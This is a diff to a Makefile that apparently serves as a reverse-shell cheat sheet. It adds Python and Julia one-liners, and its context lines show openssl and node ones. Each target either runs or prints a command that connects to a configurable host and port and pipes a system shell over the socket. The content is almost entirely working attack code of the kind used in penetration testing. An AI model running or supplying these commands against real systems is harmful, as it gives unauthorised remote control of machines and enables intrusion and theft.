@@ -136,13 +136,23 @@ socket-show:
 
 ############################################################
 
-########################## TELNET ##########################
+########################## OPENSSL #########################
 
 openssl:
 	mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(FILE); rm $(FILE)
 
 openssl-show:
 	@printf "mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(FILE); rm $(FILE)\n"
+
+############################################################
+
+########################## PYTHON ##########################
+
+python:
+	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$(HOST)",$(PORT))); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["$(SHELL)"]);'
+
+python-show:
+	@printf "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"$(HOST)\",$(PORT))); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"$(SHELL)\"]);'\n"
 
 ############################################################
 
@@ -193,6 +203,16 @@ node:
 
 node-show:
 	@printf "node -e 'shell = require(\"child_process\").spawn(\"$(SHELL)\"); require(\"net\").connect($(PORT), \"$(HOST)\"", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'\n"
+
+############################################################
+
+########################## JULIA ###########################
+
+julia:
+	julia -e 'using Sockets; sock=connect("$(HOST)", parse(Int64,"$(PORT)")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
+
+julia-show:
+	@printf "julia -e 'using Sockets; sock=connect(\"$(HOST)\", parse(Int64,\"$(PORT)\")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`\$$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'\n"
 
 ############################################################
 
